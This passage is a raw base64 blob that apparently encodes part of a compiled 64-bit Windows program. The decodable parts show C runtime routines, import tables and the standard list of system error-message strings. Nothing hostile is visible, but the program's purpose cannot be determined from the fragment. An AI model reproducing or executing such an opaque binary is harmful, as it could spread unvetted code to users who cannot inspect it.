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W50AAAAAAAAAABpbnZhbGlkIHNlZWsAAAAAaW8gZXJyb3IAAAAAAAAAAGlzIGEgZGlyZWN0b3J5AABtZXNzYWdlIHNpemUAAAAAbmV0d29yayBkb3duAAAAAG5ldHdvcmsgcmVzZXQAAABuZXR3b3JrIHVucmVhY2hhYmxlAAAAAABubyBidWZmZXIgc3BhY2UAbm8gY2hpbGQgcHJvY2VzcwAAAAAAAAAAbm8gbGluawBubyBsb2NrIGF2YWlsYWJsZQAAAAAAAABubyBtZXNzYWdlIGF2YWlsYWJsZQAAAABubyBtZXNzYWdlAAAAAAAAbm8gcHJvdG9jb2wgb3B0aW9uAAAAAAAAbm8gc3BhY2Ugb24gZGV2aWNlAAAAAAAAbm8gc3RyZWFtIHJlc291cmNlcwAAAAAAbm8gc3VjaCBkZXZpY2Ugb3IgYWRkcmVzcwAAAAAAAABubyBzdWNoIGRldmljZQAAbm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeQAAAAAAAABubyBzdWNoIHByb2Nlc3MAbm90IGEgZGlyZWN0b3J5AG5vdCBhIHNvY2tldAAAAABub3QgYSBzdHJlYW0AAAAAbm90IGNvbm5lY3RlZAAAAG5vdCBlbm91Z2ggbWVtb3J5AAAAAAAAAG5vdCBzdXBwb3J0ZWQAAABvcGVyYXRpb24gY2FuY2VsZWQAAAAAAABvcGVyYXRpb24gaW4gcHJvZ3Jlc3MAAABvcGVyYXRpb24gbm90IHBlcm1pdHRlZABvcGVyYXRpb24gbm90IHN1cHBvcnRlZABvcGVyYXRpb24gd291bGQgYmxvY2sAAABvd25lciBkZWFkAAAAAAAAcGVybWlzc2lvbiBkZW5pZWQAAAAAAAAAcHJvdG9jb2wgZXJyb3IAAHByb3RvY29sIG5vdCBzdXBwb3J0ZWQAAHJlYWQgb25seSBmaWxlIHN5c3RlbQAAAHJlc291cmNlIGRlYWRsb2NrIHdvdWxkIG9jY3VyAAAAcmVzb3VyY2UgdW5hdmFpbGFibGUgdHJ5IGFnYWluAAByZXN1bHQgb3V0IG9mIHJhbmdlAAAAAABzdGF0ZSBub3QgcmVjb3ZlcmFibGUAAABzdHJlYW0gdGltZW91dAAAdGV4dCBmaWxlIGJ1c3kAAHRpbWVkIG91dAAAAAAAAAB0b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